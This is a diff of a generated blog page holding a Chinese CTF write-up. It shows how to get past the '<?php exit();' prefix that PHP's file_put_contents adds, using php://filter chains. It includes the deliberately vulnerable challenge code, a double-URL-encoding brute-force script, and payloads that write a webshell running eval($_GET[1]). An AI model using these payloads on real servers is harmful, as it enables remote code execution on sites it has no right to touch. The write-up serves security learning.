@@ -59,7 +59,7 @@
   </style>
   <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
   </style>
-<meta name="generator" content="Hexo 5.1.1"></head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
   <div class="scrollbar" id="bar">
@@ -310,7 +310,7 @@ $sandbox = &#39;/var/www/html/&#39; . md5($_SERVER[&#39;HTTP_X_REAL_IP&#39;]);
 @mkdir($sandbox);
 @chdir($sandbox);
 highlight_file(__FILE__);
-if(isset($_GET[&#39;content&#39;])) &#123;
+if(isset($_GET[&#39;content&#39;])) {
     $content = $_GET[&#39;content&#39;];
     if(preg_match(&#39;/iconv|UCS|UTF|rot|quoted|base64/i&#39;,$content))
          die(&#39;hacker&#39;);
@@ -318,53 +318,53 @@ if(isset($_GET[&#39;content&#39;])) &#123;
         require_once($content);
     echo $content;
     file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);
-&#125;</code></pre>
+}</code></pre>
 <p>很多框架喜欢用<code>file_put_contents($filename,&#39;&lt;?php exit();&#39;.$content);</code>来生成php文件，在代码审计中也经常会遇到</p>
 <p>题目是考察一种参数可控的情况下的绕过方式。简单来说就是死亡exit的绕过，很明显出发点就在于函数的特性，其他过滤器的使用，或者配置环境</p>
 <h1 id="二次编码绕过"><a href="#二次编码绕过" class="headerlink" title="二次编码绕过"></a>二次编码绕过</h1><p>查看伪协议处理的源码</p>
-<pre><code class="c">static void php_stream_apply_filter_list(php_stream *stream, char *filterlist, int read_chain, int write_chain) /* &#123;&#123;&#123; */
-&#123;
+<pre><code class="c">static void php_stream_apply_filter_list(php_stream *stream, char *filterlist, int read_chain, int write_chain) /* {{{ */
+{
     char *p, *token = NULL;
     php_stream_filter *temp_filter;
 
     p = php_strtok_r(filterlist, &quot;|&quot;, &amp;token);
-    while (p) &#123;
+    while (p) {
         php_url_decode(p, strlen(p)); 👈 对过滤器进行了一次urldecode
-        if (read_chain) &#123;
-            if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) &#123;
+        if (read_chain) {
+            if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) {
                 php_stream_filter_append(&amp;stream-&gt;readfilters, temp_filter);
-            &#125; else &#123;
+            } else {
                 php_error_docref(NULL, E_WARNING, &quot;Unable to create filter (%s)&quot;, p);
-            &#125;
-        &#125;
-        if (write_chain) &#123;
-            if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) &#123;
+            }
+        }
+        if (write_chain) {
+            if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) {
                 php_stream_filter_append(&amp;stream-&gt;writefilters, temp_filter);
-            &#125; else &#123;
+            } else {
                 php_error_docref(NULL, E_WARNING, &quot;Unable to create filter (%s)&quot;, p);
-            &#125;
-        &#125;
+            }
+        }
         p = php_strtok_r(NULL, &quot;|&quot;, &amp;token);
-    &#125;
-&#125;</code></pre>
+    }
+}</code></pre>
 <p><code>file_put_contents</code>中可以调用伪协议，<strong>而伪协议处理时会对过滤器进行urldecode</strong>，所以<strong>可以利用二次编码绕过</strong>，不过最常见的二次编码所使用的<code>%25</code>被服务端ban了，所以通过👇脚本使用其它二次编码进行绕过</p>
 <pre><code class="php">&lt;?php
 $char = &#39;r&#39;; #构造r的二次编码
-for ($ascii1 = 0; $ascii1 &lt; 256; $ascii1++) &#123;
-    for ($ascii2 = 0; $ascii2 &lt; 256; $ascii2++) &#123;
+for ($ascii1 = 0; $ascii1 &lt; 256; $ascii1++) {
+    for ($ascii2 = 0; $ascii2 &lt; 256; $ascii2++) {
         $aaa = &#39;%&#39;.$ascii1.&#39;%&#39;.$ascii2;
-        if(urldecode(urldecode($aaa)) == $char)&#123;
+        if(urldecode(urldecode($aaa)) == $char){
             echo $char.&#39;: &#39;.$aaa. PHP_EOL;
-        &#125;
-    &#125;
-&#125;
+        }
+    }
+}
 ?&gt;
 # r: %7%32</code></pre>
 <p>之后结合之前<a href="https://0xgeekcat.github.io/2020/08/12/%E5%AD%A6%E4%B9%A0%E5%85%B3%E4%BA%8Efile-put-contents%E6%AD%BB%E4%BA%A1%E9%80%80%E5%87%BA%E7%9A%84%E7%BB%95%E8%BF%87/">学习文章</a>中学习的payload</p>
 <pre><code class="php">php://filter/write=string.%7%32ot13|&lt;?cuc cucvasb();?&gt;|/resource=geekcat.php</code></pre>
 <h1 id="过滤器构造绕过"><a href="#过滤器构造绕过" class="headerlink" title="过滤器构造绕过"></a>过滤器构造绕过</h1><p>🚫禁止使用的过滤器</p>
 <pre><code class="php">iconv|UCS|UTF|rot|quoted|base64</code></pre>
-<p><code>php:filter</code>支持使用多个过滤器，参考官方文档 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php">可用过滤器列表</a>，发现还留下了部分过滤器，所以可以考虑从这几个过滤器入手，最好用的应该就是<code>zlib</code>的<code>zlib.deflate</code>和<code>zlib.inflate</code>，组合使用压缩后再解压后内容肯定不变，不过可以在中间遍历一下剩下的几个过滤器，看看中间进行什么操作会影响后续inflate的内容，简单遍历一下可以发现中间插入string.tolower转后会把空格和exit处理了就可以绕过exit</p>
+<p><code>php:filter</code>支持使用多个过滤器，参考官方文档 <a href="https://www.php.net/manual/zh/filters.php" target="_blank" rel="noopener">可用过滤器列表</a>，发现还留下了部分过滤器，所以可以考虑从这几个过滤器入手，最好用的应该就是<code>zlib</code>的<code>zlib.deflate</code>和<code>zlib.inflate</code>，组合使用压缩后再解压后内容肯定不变，不过可以在中间遍历一下剩下的几个过滤器，看看中间进行什么操作会影响后续inflate的内容，简单遍历一下可以发现中间插入string.tolower转后会把空格和exit处理了就可以绕过exit</p>
 <pre><code class="php">php://filter/zlib.deflate|string.tolower|zlib.inflate|php%0deval($_GET[1]);/resource=Cyc1e.php</code></pre>
 <p><strong><font color="#dd0000">此方法个人并没有复现成功，存在以下疑问</font></strong></p>
 <ol>
